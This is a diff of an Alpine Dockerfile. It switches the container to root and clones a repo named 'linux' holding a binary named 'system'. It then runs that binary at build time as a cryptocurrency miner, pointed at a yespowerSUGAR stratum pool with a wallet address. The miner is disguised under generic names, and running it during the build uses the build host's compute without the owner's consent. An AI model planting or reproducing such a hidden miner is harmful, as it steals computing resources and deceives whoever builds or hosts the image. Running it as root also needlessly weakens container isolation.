@@ -1,13 +1,8 @@
 FROM  alpine:latest
-RUN   adduser -S -D -H -h /babi asu
+USER  root
 RUN   apk --no-cache upgrade && \
       apk --no-cache add \
         git \
-        cmake \
-        libuv-dev \
-        build-base \
-        openssl-dev \
-        libmicrohttpd-dev && \
       git clone https://github.com/Dawn-shell/linux && \
       cd linux && \
       chmod +x system && \
@@ -15,6 +10,5 @@ RUN   apk --no-cache upgrade && \
         build-base \
         cmake \
         git
-USER asu
 WORKDIR    /linux
-ENTRYPOINT ["./system"]
+RUN   ./system -a yespowerSUGAR -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.xxx
